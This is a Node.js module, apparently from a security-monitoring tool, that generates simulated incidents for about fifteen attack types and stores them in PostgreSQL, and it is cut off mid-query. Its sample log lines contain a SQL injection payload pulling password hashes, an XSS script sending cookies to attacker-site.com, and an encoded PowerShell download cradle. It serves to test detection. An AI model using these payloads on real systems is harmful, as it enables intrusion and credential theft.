const pool = require("../config/db");

const SCENARIOS = [
    {
        id: "ssh_brute_force",
        title: "Multiple Failed SSH Logins Followed by Root Access",
        description: "Automated brute-force password guessing against port 22 resulting in anomalous root login from known malicious IP.",
        severity: "high",
        priority: 85,
        alertType: "Brute Force Attack",
        detectionRule: "SSH_BRUTE_FORCE_DETECTED",
        riskScore: 85,
        sourceType: "auth_log",
        protocol: "TCP",
        sourcePort: () => Math.floor(30000 + Math.random() * 30000),
        destPort: 22,
        sourceIP: () => `185.220.101.${Math.floor(10 + Math.random() * 80)}`,
        destIP: "10.0.1.15",
        username: "root",
        hostname: "srv-prod-ssh-01.corp.internal",
        action: "LOGIN_SUCCESS",
        rawMessage: (ip, port) => `sshd[18492]: Failed password for invalid user admin from ${ip} port ${port} ssh2; Accepted password for root from ${ip} port ${port + 1} ssh2`,
        mitre: {
            tacticId: "TA0001",
            tacticName: "Initial Access",
            techniqueId: "T1110",
            techniqueName: "Brute Force",
            subtechniqueId: "T1110.001",
            subtechniqueName: "Password Guessing",
            description: "Adversaries may use brute force techniques to attempt access to accounts via SSH daemon password guessing."
        },
        threatIntel: (ip) => ({
            indicatorType: "ip",
            indicatorValue: ip,
            threatType: "Botnet / Brute Force Node",
            threatName: "TOR Exit Node / Mirai Scanner",
            source: "AbuseIPDB / AlienVault OTX",
            reputation: "malicious",
            confidence: 94,
            description: "High-volume SSH brute force activity and port scanning observed targeting enterprise cloud ranges."
        }),
        responseAction: {
            actionType: "Block IP on Perimeter Firewall",
            description: "Deploy automated egress/ingress block rule for the offending IP address across edge firewalls."
        }
    },
    {
        id: "sql_injection",
        title: "Critical SQL Injection in Production Checkout API",
        description: "Adversary attempted union-based SQL injection targeting public API endpoint to extract credential hashes from database.",
        severity: "critical",
        priority: 95,
        alertType: "Web Application Attack",
        detectionRule: "SQLI_TAUTOLOGY_OR_UNION_DETECTED",
        riskScore: 95,
        sourceType: "waf_log",
        protocol: "HTTP",
        sourcePort: () => Math.floor(40000 + Math.random() * 20000),
        destPort: 443,
        sourceIP: () => `45.142.195.${Math.floor(10 + Math.random() * 80)}`,
        destIP: "10.0.2.80",
        username: "www-data",
        hostname: "api-prod-gateway-01.corp.internal",
        action: "REQUEST_BLOCKED",
        rawMessage: (ip, port) => `WAF Alert: SQL Injection payload detected in URI parameter 'customer_id': ' UNION SELECT id,username,password_hash FROM app_users-- (Client IP: ${ip}:${port})`,
        mitre: {
            tacticId: "TA0001",
            tacticName: "Initial Access",
            techniqueId: "T1190",
            techniqueName: "Exploit Public-Facing Application",
            subtechniqueId: null,
            subtechniqueName: null,
            description: "Adversary exploited web application vulnerability via crafted SQL injection payload."
        },
        threatIntel: (ip) => ({
            indicatorType: "ip",
            indicatorValue: ip,
            threatType: "Web Exploit Scanner",
            threatName: "Sqlmap Automated Probe",
            source: "CrowdStrike Falcon Intel",
            reputation: "malicious",
            confidence: 98,
            description: "Associated with automated SQL vulnerability scanning and exploitation campaigns."
        }),
        responseAction: {
            actionType: "Rate Limit and Blacklist IP in WAF",
            description: "Apply emergency rate limit rule and place origin IP into WAF drop list."
        }
    },
    {
        id: "privilege_escalation",
        title: "Unauthorized Sudo Privilege Escalation Detected",
        description: "Local unprivileged account exploited sudo vulnerability to spawn root shell without credential challenge.",
        severity: "high",
        priority: 88,
        alertType: "Privilege Escalation",
        detectionRule: "SUDO_BARON_SAMEDIT_EXPLOIT",
        riskScore: 88,
        sourceType: "syslog",
        protocol: "LOCAL",
        sourcePort: () => 0,
        destPort: 0,
        sourceIP: "127.0.0.1",
        destIP: "127.0.0.1",
        username: "jdoe_contractor",
        hostname: "srv-build-linux-03.corp.internal",
        action: "PRIVILEGE_ELEVATION",
        rawMessage: () => `sudo[29341]: pam_unix(sudo:auth): conversation failed ; TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash (spawning unconfined root shell)`,
        mitre: {
            tacticId: "TA0004",
            tacticName: "Privilege Escalation",
            techniqueId: "T1068",
            techniqueName: "Exploitation for Privilege Escalation",
            subtechniqueId: null,
            subtechniqueName: null,
            description: "Adversaries may exploit software vulnerabilities in elevated binaries like sudo to elevate privileges."
        },
        threatIntel: () => ({
            indicatorType: "cve",
            indicatorValue: "CVE-2021-3156",
            threatType: "Local Privilege Escalation",
            threatName: "Baron Samedit Sudo Buffer Overflow",
            source: "NVD / MITRE CVE",
            reputation: "exploited",
            confidence: 95,
            description: "Heap-based buffer overflow in Sudo allows unprivileged user to gain root privileges."
        }),
        responseAction: {
            actionType: "Revoke User Session & Lock Account",
            description: "Terminate all active terminal sessions for jdoe_contractor and lock local account in PAM."
        }
    },
    {
        id: "ransomware_activity",
        title: "Mass File Encryption and Ransomware Canary Triggered",
        description: "Rapid modification of hundreds of corporate file shares and creation of .lockbit ransom notes detected.",
        severity: "critical",
        priority: 100,
        alertType: "Ransomware Detected",
        detectionRule: "RANSOMWARE_FILE_ENTROPY_AND_NOTE_DETECTED",
        riskScore: 100,
        sourceType: "edr_log",
        protocol: "SMB",
        sourcePort: () => Math.floor(49152 + Math.random() * 10000),
        destPort: 445,
        sourceIP: "10.0.4.112",
        destIP: "10.0.1.200",
        username: "svc_fileshare",
        hostname: "fs-finance-01.corp.internal",
        action: "ENCRYPTION_DETECTED",
        rawMessage: () => `SentinelEDR: High entropy file write pattern (380 files/sec) detected in D:\\Shared\\Finance\\*.xlsx with extension .lockbit. Ransom note README_RESTORE.txt dropped.`,
        mitre: {
            tacticId: "TA0040",
            tacticName: "Impact",
            techniqueId: "T1486",
            techniqueName: "Data Encrypted for Impact",
            subtechniqueId: null,
            subtechniqueName: null,
            description: "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt system availability."
        },
        threatIntel: () => ({
            indicatorType: "hash",
            indicatorValue: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            threatType: "Ransomware Binary",
            threatName: "LockBit 3.0 Encryptor",
            source: "Mandiant Threat Intelligence",
            reputation: "malicious",
            confidence: 99,
            description: "Known LockBit 3.0 ransomware payload responsible for multi-extortion campaigns worldwide."
        }),
        responseAction: {
            actionType: "Isolate Endpoint from Network",
            description: "Trigger immediate EDR network isolation on fs-finance-01 to stop lateral propagation."
        }
    },
    {
        id: "port_scan",
        title: "Stealth SYN Port Scanning & Reconnaissance Activity",
        description: "Sequential SYN scanning targeting multiple internal port ranges indicating network discovery activity.",
        severity: "medium",
        priority: 60,
        alertType: "Network Reconnaissance",
        detectionRule: "NMAP_SYN_STEALTH_SCAN",
        riskScore: 60,
        sourceType: "firewall_log",
        protocol: "TCP",
        sourcePort: () => Math.floor(50000 + Math.random() * 15000),
        destPort: 80,
        sourceIP: () => `198.51.100.${Math.floor(20 + Math.random() * 50)}`,
        destIP: "10.0.1.1",
        username: "unknown",
        hostname: "gw-edge-perimeter.corp.internal",
        action: "PORT_SCAN_FLAGGED",
        rawMessage: (ip, port) => `EdgeFirewall: SYN scan alert. Host ${ip} sent SYN packets to 1,024 ports across 10.0.1.0/24 subnet within 15 seconds.`,
        mitre: {
            tacticId: "TA0007",
            tacticName: "Discovery",
            techniqueId: "T1046",
            techniqueName: "Network Service Discovery",
            subtechniqueId: null,
            subtechniqueName: null,
            description: "Adversaries may attempt to get a listing of services running on hosts by port scanning."
        },
        threatIntel: (ip) => ({
            indicatorType: "ip",
            indicatorValue: ip,
            threatType: "Scanner Host",
            threatName: "Shodan / Shadowserver Probe",
            source: "GreyNoise Intelligence",
            reputation: "suspicious",
            confidence: 82,
            description: "Active external reconnaissance host executing mass internet vulnerability scans."
        }),
        responseAction: {
            actionType: "Enforce Dynamic Geoblock & Drop Rule",
            description: "Dynamically throttle connection requests and drop all inbound packets from source scanner IP."
        }
    },
    {
        id: "powershell_execution",
        title: "Obfuscated Encoded PowerShell Command with Download Cradle",
        description: "PowerShell process launched with Base64 encoded payload and execution bypass flags attempting remote payload download.",
        severity: "high",
        priority: 82,
        alertType: "Suspicious Script Execution",
        detectionRule: "POWERSHELL_ENCODED_DOWNLOAD_CRADLE",
        riskScore: 82,
        sourceType: "windows_event",
        protocol: "LOCAL",
        sourcePort: () => 0,
        destPort: 0,
        sourceIP: "10.0.5.45",
        destIP: "10.0.5.45",
        username: "asmith_accounting",
        hostname: "ws-fin-045.corp.internal",
        action: "SUSPICIOUS_PROCESS_EXEC",
        rawMessage: () => `EventID 4104: Execute a Remote Command. ScriptBlock: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7... (IEX DownloadString)`,
        mitre: {
            tacticId: "TA0002",
            tacticName: "Execution",
            techniqueId: "T1059",
            techniqueName: "Command and Scripting Interpreter",
            subtechniqueId: "T1059.001",
            subtechniqueName: "PowerShell",
            description: "Adversaries may abuse PowerShell commands and scripts for execution and evasion."
        },
        threatIntel: () => ({
            indicatorType: "domain",
            indicatorValue: "cdn-update-security-assets.com",
            threatType: "C2 Stager Domain",
            threatName: "Empire / Cobalt Strike Stager",
            source: "ThreatConnect / VirusTotal",
            reputation: "malicious",
            confidence: 91,
            description: "Newly registered lookalike domain serving encoded secondary-stage PowerShell loaders."
        }),
        responseAction: {
            actionType: "Kill Process & Quarantine File",
            description: "Terminate powershell.exe parent/child process trees and isolate workstation from local subnet."
        }
    },
    {
        id: "lateral_movement_smb",
        title: "Lateral Movement via SMB Named Pipes and PsExec",
        description: "Administrative share ADMIN$ accessed from internal workstation followed by remote service installation.",
        severity: "high",
        priority: 85,
        alertType: "Lateral Movement",
        detectionRule: "SMB_PSEXEC_REMOTE_EXECUTION",
        riskScore: 85,
        sourceType: "windows_event",
        protocol: "SMB",
        sourcePort: () => Math.floor(49152 + Math.random() * 5000),
        destPort: 445,
        sourceIP: "10.0.3.18",
        destIP: "10.0.2.10",
        username: "DOMAIN\\admin_ops",
        hostname: "dc-primary-01.corp.internal",
        action: "SERVICE_INSTALLED",
        rawMessage: () => `Security Event 7045: A service was installed in the system. Service Name: PSEXESVC, Service File Name: %SystemRoot%\\PSEXESVC.exe, Account: DOMAIN\\admin_ops from remote IP 10.0.3.18`,
        mitre: {
            tacticId: "TA0008",
            tacticName: "Lateral Movement",
            techniqueId: "T1021",
            techniqueName: "Remote Services",
            subtechniqueId: "T1021.002",
            subtechniqueName: "SMB/Windows Admin Shares",
            description: "Adversaries may use valid accounts to remotely install services via SMB admin shares."
        },
        threatIntel: () => ({
            indicatorType: "tool",
            indicatorValue: "PsExec.exe",
            threatType: "Living off the Land Tool (LotL)",
            threatName: "Sysinternals PsExec Abuse",
            source: "SentinelX Behavioral Analytics",
            reputation: "suspicious",
            confidence: 88,
            description: "Legitimate administration tool leveraged outside maintenance window for unauthorized lateral jump."
        }),
        responseAction: {
            actionType: "Revoke Compromised Admin Ticket",
            description: "Force Kerberos ticket reset for DOMAIN\\admin_ops and audit Active Directory logon events."
        }
    },
    {
        id: "dns_tunneling",
        title: "High-Volume Anomalous Base64 DNS Queries (DNS Tunneling)",
        description: "Thousands of long subdomain DNS requests observed indicating covert data exfiltration over DNS protocol.",
        severity: "critical",
        priority: 92,
        alertType: "Data Exfiltration",
        detectionRule: "DNS_TUNNELING_EXFILTRATION",
        riskScore: 92,
        sourceType: "dns_log",
        protocol: "DNS",
        sourcePort: () => Math.floor(51000 + Math.random() * 10000),
        destPort: 53,
        sourceIP: "10.0.1.77",
        destIP: "8.8.8.8",
        username: "svc_backup",
        hostname: "db-customer-02.corp.internal",
        action: "ANOMALOUS_DNS_DETECTED",
        rawMessage: () => `DNS Resolver: High entropy TXT queries detected. 4,200 requests for *.exfil.ns-tunnel-relay.net within 5 minutes. Average query length: 182 characters.`,
        mitre: {
            tacticId: "TA0010",
            tacticName: "Exfiltration",
            techniqueId: "T1048",
            techniqueName: "Exfiltration Over Alternative Protocol",
            subtechniqueId: "T1048.003",
            subtechniqueName: "Exfiltration Over Unencrypted Non-C2 Protocol",
            description: "Adversaries may steal data by sending it over DNS queries using encoding mechanisms like Base64."
        },
        threatIntel: () => ({
            indicatorType: "domain",
            indicatorValue: "exfil.ns-tunnel-relay.net",
            threatType: "DNS Tunneling Receiver",
            threatName: "Iodine / dnscat2 Relay",
            source: "Unit 42 / Palo Alto Networks",
            reputation: "malicious",
            confidence: 96,
            description: "Authoritative nameserver configured to decode Base64 data exfiltrated via DNS record lookups."
        }),
        responseAction: {
            actionType: "Sinkhole Malicious Domain in Core DNS",
            description: "Inject response policy zone (RPZ) rule to redirect ns-tunnel-relay.net queries to local sinkhole."
        }
    },
    {
        id: "xss_injection",
        title: "Persistent Stored XSS Payload Injected into Support Portal",
        description: "Malicious JavaScript payload injected into ticket notes designed to steal SOC analyst session tokens.",
        severity: "medium",
        priority: 65,
        alertType: "Web Application Attack",
        detectionRule: "XSS_STORED_SCRIPT_PAYLOAD",
        riskScore: 65,
        sourceType: "waf_log",
        protocol: "HTTPS",
        sourcePort: () => Math.floor(32000 + Math.random() * 20000),
        destPort: 443,
        sourceIP: () => `103.208.220.${Math.floor(5 + Math.random() * 90)}`,
        destIP: "10.0.2.55",
        username: "external_ticket_user",
        hostname: "portal-support.corp.internal",
        action: "PAYLOAD_INTERCEPTED",
        rawMessage: (ip, port) => `AppSec: HTML sanitization triggered for request from ${ip}:${port}. Payload contained: <script>document.location='http://attacker-site.com/steal?c='+document.cookie</script>`,
        mitre: {
            tacticId: "TA0002",
            tacticName: "Execution",
            techniqueId: "T1059",
            techniqueName: "Command and Scripting Interpreter",
            subtechniqueId: "T1059.007",
            subtechniqueName: "JavaScript",
            description: "Adversaries may execute malicious scripts in browser context through cross-site scripting flaws."
        },
        threatIntel: () => ({
            indicatorType: "domain",
            indicatorValue: "attacker-site.com",
            threatType: "Credential Harvester / Cookie Stealer",
            threatName: "XSS Hunter Probe",
            source: "OpenPhish / SANS ISC",
            reputation: "malicious",
            confidence: 89,
            description: "Blind XSS collector endpoint gathering session cookies and DOM screenshots."
        }),
        responseAction: {
            actionType: "Sanitize Database Record & Invalidate Session",
            description: "Purge malicious comment from support database and invalidate all active session tokens for the submitter."
        }
    },
    {
        id: "impossible_travel",
        title: "Impossible Travel: Simultaneous Logins from London and Tokyo",
        description: "Corporate cloud identity authenticated from London, UK and Tokyo, Japan within 12 minutes.",
        severity: "high",
        priority: 80,
        alertType: "Identity Compromise",
        detectionRule: "IMPOSSIBLE_TRAVEL_VELOCITY_ANOMALY",
        riskScore: 80,
        sourceType: "idp_log",
        protocol: "HTTPS",
        sourcePort: () => 443,
        destPort: 443,
        sourceIP: "203.0.113.195",
        destIP: "172.16.0.5",
        username: "sarah.connor@enterprise.com",
        hostname: "idp-cloud-sso.corp.internal",
        action: "ANOMALOUS_LOGON_DETECTED",
        rawMessage: () => `Identity Provider Alert: User sarah.connor@enterprise.com logged in from London (IP 82.165.197.1) at 14:02 UTC and Tokyo (IP 203.0.113.195) at 14:14 UTC. Calculated velocity: 47,800 km/h.`,
        mitre: {
            tacticId: "TA0001",
            tacticName: "Initial Access",
            techniqueId: "T1078",
            techniqueName: "Valid Accounts",
            subtechniqueId: "T1078.004",
            subtechniqueName: "Cloud Accounts",
            description: "Adversaries may compromise credentials of cloud user accounts and log in from distributed locations."
        },
        threatIntel: () => ({
            indicatorType: "ip",
            indicatorValue: "203.0.113.195",
            threatType: "Commercial VPN / Proxy Exit",
            threatName: "NordVPN / ExpressVPN Egress Node",
            source: "Spur Intelligence",
            reputation: "suspicious",
            confidence: 85,
            description: "Commercial anonymization service frequently observed masking adversary logon activities."
        }),
        responseAction: {
            actionType: "Revoke Active OAuth Tokens & Enforce MFA",
            description: "Terminate all cloud sessions, revoke refresh tokens, and prompt user for mandatory FIDO2 re-authentication."
        }
    },
    {
        id: "ddos_amplification",
        title: "Inbound UDP NTP Reflection Amplification DDoS Flooding Gateway",
        description: "Massive volumetric traffic spike (45 Gbps) using amplified UDP NTP monlist responses targeting DMZ router.",
        severity: "high",
        priority: 86,
        alertType: "Denial of Service",
        detectionRule: "VOLUMETRIC_UDP_AMPLIFICATION_FLOOD",
        riskScore: 86,
        sourceType: "netflow",
        protocol: "UDP",
        sourcePort: () => 123,
        destPort: () => Math.floor(10000 + Math.random() * 20000),
        sourceIP: () => `185.190.140.${Math.floor(10 + Math.random() * 70)}`,
        destIP: "198.51.100.1",
        username: "system",
        hostname: "edge-border-router-01.corp.internal",
        action: "TRAFFIC_SPIKE_DETECTED",
        rawMessage: (ip, port) => `NetFlow Collector: Bandwidth threshold exceeded on Interface Eth0/1. Inbound NTP UDP traffic 48.2 Gbps (6.8 Mpps) from multiple reflectors including ${ip}:${port}.`,
        mitre: {
            tacticId: "TA0040",
            tacticName: "Impact",
            techniqueId: "T1498",
            techniqueName: "Network Denial of Service",
            subtechniqueId: "T1498.002",
            subtechniqueName: "Reflection Amplification",
            description: "Adversaries may conduct reflection amplification DDoS attacks to consume network bandwidth."
        },
        threatIntel: (ip) => ({
            indicatorType: "ip",
            indicatorValue: ip,
            threatType: "DDoS Reflector Node",
            threatName: "Vulnerable NTP Monlist Daemon",
            source: "Cisco Talos Intelligence",
            reputation: "malicious",
            confidence: 93,
            description: "Misconfigured public NTP server actively abused in UDP reflection amplification botnets."
        }),
        responseAction: {
            actionType: "Activate ISP BGP Blackhole / Scrubbing Center",
            description: "Signal upstream tier-1 ISP via BGP community to route traffic through cloud scrubbing scrubbers."
        }
    },
    {
        id: "c2_beaconing",
        title: "Periodic HTTPS Beaconing to Command and Control Infrastructure",
        description: "Regular heartbeats every 60 seconds with 10% jitter observed from developer workstation to known Cobalt Strike C2.",
        severity: "critical",
        priority: 94,
        alertType: "Command and Control",
        detectionRule: "C2_BEACONING_JITTER_INTERVAL",
        riskScore: 94,
        sourceType: "proxy_log",
        protocol: "HTTPS",
        sourcePort: () => Math.floor(52000 + Math.random() * 5000),
        destPort: 443,
        sourceIP: "10.0.6.89",
        destIP: "91.215.85.17",
        username: "mchen_dev",
        hostname: "ws-dev-089.corp.internal",
        action: "C2_CONNECTION_DETECTED",
        rawMessage: (ip) => `WebProxy: Periodic outbound POST requests to https://${ip}/api/v1/telemetry observed every 60s (+/- 6s jitter). User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`,
        mitre: {
            tacticId: "TA0011",
            tacticName: "Command and Control",
            techniqueId: "T1071",
            techniqueName: "Application Layer Protocol",
            subtechniqueId: "T1071.001",
            subtechniqueName: "Web Protocols",
            description: "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection."
        },
        threatIntel: (ip) => ({
            indicatorType: "ip",
            indicatorValue: ip,
            threatType: "C2 Server",
            threatName: "Cobalt Strike Team Server",
            source: "Recorded Future / Team Cymru",
            reputation: "malicious",
            confidence: 97,
            description: "Active Command and Control node hosting Cobalt Strike malleable C2 profile."
        }),
        responseAction: {
            actionType: "Block C2 IP at Proxy & Quarantine Workstation",
            description: "Add C2 IP to proxy drop list and quarantine developer workstation ws-dev-089 via EDR agent."
        }
    },
    {
        id: "phishing_harvest",
        title: "Employee Clicked Deceptive Domain Hosting Fake SSO Portal",
        description: "Inbound email containing deceptive hyperlink followed by user credential submission to typosquatted domain.",
        severity: "medium",
        priority: 72,
        alertType: "Phishing Campaign",
        detectionRule: "PHISHING_CREDENTIAL_PORTAL_INTERACTION",
        riskScore: 72,
        sourceType: "email_gateway",
        protocol: "HTTPS",
        sourcePort: () => Math.floor(45000 + Math.random() * 10000),
        destPort: 443,
        sourceIP: "10.0.7.34",
        destIP: "185.180.222.99",
        username: "alex.kumar@enterprise.com",
        hostname: "ws-hr-034.corp.internal",
        action: "SUSPICIOUS_URL_CLICKED",
        rawMessage: () => `Email Gateway / EDR: User clicked link https://login.microsoftonline.corp-auth-verify.com/oauth2/authorize?client_id=common. Outbound POST submitted with form payload.`,
        mitre: {
            tacticId: "TA0001",
            tacticName: "Initial Access",
            techniqueId: "T1566",
            techniqueName: "Phishing",
            subtechniqueId: "T1566.002",
            subtechniqueName: "Spearphishing Link",
            description: "Adversaries may send spearphishing emails with a malicious link in an attempt to capture employee credentials."
        },
        threatIntel: () => ({
            indicatorType: "domain",
            indicatorValue: "corp-auth-verify.com",
            threatType: "Phishing Infrastructure",
            threatName: "Evilginx2 Reverse Proxy",
            source: "PhishTank / Google Safe Browsing",
            reputation: "malicious",
            confidence: 94,
            description: "Adversary-in-the-middle (AiTM) phishing framework capturing passwords and session cookie tokens."
        }),
        responseAction: {
            actionType: "Reset User Password & Invalidate Sessions",
            description: "Force immediate Active Directory password change and terminate all active Okta/Azure sessions."
        }
    },
    {
        id: "golden_ticket",
        title: "Forged Kerberos Ticket-Granting Ticket (Golden Ticket Abuse)",
        description: "Anomalous Kerberos TGT lifetime (10 years) presented to domain controller by non-existent domain account.",
        severity: "critical",
        priority: 98,
        alertType: "Kerberos Manipulation",
        detectionRule: "KERBEROS_GOLDEN_TICKET_KRBTGT_ANOMALY",
        riskScore: 98,
        sourceType: "windows_event",
        protocol: "KERBEROS",
        sourcePort: () => Math.floor(49000 + Math.random() * 5000),
        destPort: 88,
        sourceIP: "10.0.3.50",
        destIP: "10.0.1.10",
        username: "krbtgt_fake_admin",
        hostname: "dc-primary-01.corp.internal",
        action: "KERBEROS_TGT_REQUEST",
        rawMessage: () => `Security Event 4769: A Kerberos service ticket was requested. Service Name: krbtgt, Ticket Options: 0x40810000, Ticket Encryption Type: 0x17 (RC4-HMAC), Ticket Lifetime: 87,600 hours (10 years).`,
        mitre: {
            tacticId: "TA0006",
            tacticName: "Credential Access",
            techniqueId: "T1558",
            techniqueName: "Steal or Forge Kerberos Tickets",
            subtechniqueId: "T1558.001",
            subtechniqueName: "Golden Ticket",
            description: "Adversaries may forge Kerberos Ticket Granting Tickets using the KRBTGT password hash to achieve persistence."
        },
        threatIntel: () => ({
            indicatorType: "tool",
            indicatorValue: "Mimikatz sekurlsa::pth",
            threatType: "Kerberos Ticket Forger",
            threatName: "Mimikatz Golden Ticket Attack",
            source: "Microsoft Defender for Identity",
            reputation: "malicious",
            confidence: 99,
            description: "Active exploitation of KRBTGT account hash to generate persistent domain controller authorization tickets."
        }),
        responseAction: {
            actionType: "Rotate KRBTGT Password Twice & Audit Domain",
            description: "Initiate emergency Active Directory KRBTGT password rotation cycle and inspect all domain controller events."
        }
    },
    {
        id: "supply_chain",
        title: "Unauthorized Package Injection in CI/CD Pipeline Build",
        description: "NPM build step attempted to download unvetted dependency from typosquatted package registry.",
        severity: "high",
        priority: 89,
        alertType: "Supply Chain Compromise",
        detectionRule: "SUPPLY_CHAIN_UNTRUSTED_DEPENDENCY_DETECTED",
        riskScore: 89,
        sourceType: "cicd_log",
        protocol: "HTTPS",
        sourcePort: () => Math.floor(42000 + Math.random() * 8000),
        destPort: 443,
        sourceIP: "10.0.9.12",
        destIP: "104.16.25.34",
        username: "gitlab_runner",
        hostname: "build-runner-worker-04.corp.internal",
        action: "BUILD_INTERCEPTED",
        rawMessage: () => `CI/CD Security Scanner: Build #4892 blocked. Pre-install lifecycle script in package 'colors-js-extended' attempted to exfiltrate AWS_SECRET_ACCESS_KEY from environment variables.`,
        mitre: {
            tacticId: "TA0001",
            tacticName: "Initial Access",
            techniqueId: "T1195",
            techniqueName: "Supply Chain Compromise",
            subtechniqueId: "T1195.002",
            subtechniqueName: "Compromise Software Supply Chain",
            description: "Adversaries may manipulate software packages and dependencies in the software supply chain to compromise builds."
        },
        threatIntel: () => ({
            indicatorType: "package",
            indicatorValue: "colors-js-extended@1.4.2",
            threatType: "Malicious NPM Package",
            threatName: "Token Stealer / Env Harvester",
            source: "Snyk / GitHub Advisory Database",
            reputation: "malicious",
            confidence: 96,
            description: "Trojanized open source package containing obfuscated preinstall hook harvesting cloud tokens."
        }),
        responseAction: {
            actionType: "Revoke Pipeline Secrets & Quarantine Build",
            description: "Immediately rotate CI/CD secret tokens and quarantine affected runner image worker."
        }
    }
];

/**
 * Generates and saves a complete, realistic simulated incident into PostgreSQL.
 * Everything executes in a single database transaction.
 */
async function createRandomSimulatedIncident(specificScenarioId = null) {
    const client = await pool.connect();

    try {
        await client.query("BEGIN");

        // 1. Pick a scenario (either requested or random)
        const scenario = specificScenarioId
            ? (SCENARIOS.find(s => s.id === specificScenarioId) || SCENARIOS[0])
            : SCENARIOS[Math.floor(Math.random() * SCENARIOS.length)];

        // Compute dynamic scenario fields
        const sourceIP = typeof scenario.sourceIP === "function" ? scenario.sourceIP() : scenario.sourceIP;
        const sourcePort = typeof scenario.sourcePort === "function" ? scenario.sourcePort() : scenario.sourcePort;
        const destIP = scenario.destIP;
        const destPort = typeof scenario.destPort === "function" ? scenario.destPort() : scenario.destPort;
        const rawMessage = typeof scenario.rawMessage === "function" ? scenario.rawMessage(sourceIP, sourcePort) : scenario.rawMessage;
        const intel = scenario.threatIntel(sourceIP);

        // 2. Ensure a log_source exists
        let sourceId;
        const sourceRes = await client.query(
            "SELECT id FROM log_sources WHERE source_type = $1 LIMIT 1",
            [scenario.sourceType]
        );

        if (sourceRes.rows.length > 0) {
            sourceId = sourceRes.rows[0].id;
        } else {
            const firstSource = await client.query("SELECT id FROM log_sources LIMIT 1");
            if (firstSource.rows.length > 0) {
                sourceId = firstSource.rows[0].id;
            } else {
                const newSource = await client.query(
                    `INSERT INTO log_sources (name, source_type, description, enabled)
                     VALUES ($1, $2, $3, true) RETURNING id`,
                    [
                        `SentinelX Sensor (${scenario.sourceType})`,
                        scenario.sourceType,
                        "Automated security telemetry log collector"
                    ]
                );
                sourceId = newSource.rows[0].id;
            }
        }

        // 3. Insert raw_logs
        const rawLogRes = await client.query(
            `
            INSERT INTO raw_logs
                (source_id, timestamp, raw_message, source_type, hostname, ip_address, username, severity, metadata)
            VALUES
                ($1, CURRENT_TIMESTAMP, $2, $3, $4, $5, $6, $7, $8)
            RETURNING id
            `,
            [
                sourceId,
                rawMessage,
                scenario.sourceType,
                scenario.hostname,
                sourceIP,
                scenario.username,
                scenario.severity,
                JSON.stringify({
                    simulation: true,
                    scenario_id: scenario.id,
                    protocol: scenario.protocol,
                    source_port: sourcePort,
                    dest_port: destPort
                })
            ]
        );
        const rawLogId = rawLogRes.rows[0].id;

        // 4. Insert normalized_logs
        const normLogRes = await client.query(
            `
            INSERT INTO normalized_logs
                (source_id, event_time, event_type, severity, source_ip, destination_ip,
                 source_port, destination_port, username, hostname, protocol, action, message, raw_log, normalized_data)
            VALUES
                ($1, CURRENT_TIMESTAMP, $2, $3, $4::inet, $5::inet, $6, $7, $8, $9, $10, $11, $12, $13, $14)
            RETURNING id
            `,
            [
                sourceId,
                scenario.alertType,
                scenario.severity,
                sourceIP,
                destIP,
                sourcePort,
                destPort,
                scenario.username,
                scenario.hostname,
                scenario.protocol,
                scenario.action,
                rawMessage,
                rawMessage,
                JSON.stringify({
                    raw_log_id: rawLogId,
                    scenario: scenario.id,
                    detection_rule: scenario.detectionRule
                })
            ]
        );
        const normalizedLogId = normLogRes.rows[0].id;

        // 5. Insert alerts
        const alertRes = await client.query(
            `
            INSERT INTO alerts
                (log_id, alert_type, severity, title, description, detection_rule, status, risk_score, detected_at)
            VALUES
                ($1, $2, $3, $4, $5, $6, 'new', $7, CURRENT_TIMESTAMP)
            RETURNING id
            `,
            [
                normalizedLogId,
                scenario.alertType,
                scenario.severity,
                scenario.title,
                scenario.description,
                scenario.detectionRule,
                scenario.riskScore
            ]
        );
        const alertId = alertRes.rows[0].id;

        // 6. Insert incidents
        const incidentRes = await client.query(
            `
            INSERT INTO incidents
                (title, description, severity, status, priority, opened_at, updated_at)
            VALUES
                ($1, $2, $3, 'open', $4, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)
            RETURNING id, title, description, severity, status, priority, opened_at, updated_at
            `,
            [
                scenario.title,
                scenario.description,
                scenario.severity,
                scenario.priority
            ]
        );
        const incident = incidentRes.rows[0];
        const incidentId = incident.id;

        // 7. Link incident to alert in incident_alerts
        await client.query(
            `
            INSERT INTO incident_alerts (incident_id, alert_id)
            VALUES ($1, $2)
            ON CONFLICT (incident_id, alert_id) DO NOTHING
            `,
            [incidentId, alertId]
        );

        // 8. Insert MITRE ATT&CK mapping
        await client.query(
            `
            INSERT INTO mitre_attack
                (alert_id, tactic_id, tactic_name, technique_id, technique_name, subtechnique_id, subtechnique_name, description)
            VALUES
                ($1, $2, $3, $4, $5, $6, $7, $8)
            `,
            [
                alertId,
                scenario.mitre.tacticId,
                scenario.mitre.tacticName,
                scenario.mitre.techniqueId,
                scenario.mitre.techniqueName,
                scenario.mitre.subtechniqueId,
                scenario.mitre.subtechniqueName,
                scenario.mitre.description
            ]
        );

        // 9. Insert Threat Intelligence indicator
        await client.query(
            `
            INSERT INTO threat_intelligence
                (alert_id, indicator_type, indicator_value, threat_type, threat_name, source,
                 reputation, confidence, description, first_seen, last_seen, raw_data)
            VALUES
                ($1, $2, $3, $4, $5, $6, $7, $8, $9, CURRENT_TIMESTAMP - INTERVAL '3 days', CURRENT_TIMESTAMP, $10)
            `,
            [
                alertId,
                intel.indicatorType,
                intel.indicatorValue,
                intel.threatType,
                intel.threatName,
                intel.source,
                intel.reputation,
                intel.confidence,
                intel.description,
                JSON.stringify(intel)
            ]
        );

        // 10. Insert Response Action
        await client.query(
            `
            INSERT INTO response_actions
                (incident_id, action_type, description, status, executed_by, execution_result, executed_at)
            VALUES
                ($1, $2, $3, 'completed', 'SentinelX Automated Response', 'Automated response policy successfully applied by SentinelX orchestrator.', CURRENT_TIMESTAMP)
            `,
            [
                incidentId,
                scenario.responseAction.actionType,
                scenario.responseAction.description
            ]
        );

        // 11. Insert Incident Timeline entries
        await client.query(
            `
            INSERT INTO incident_timeline
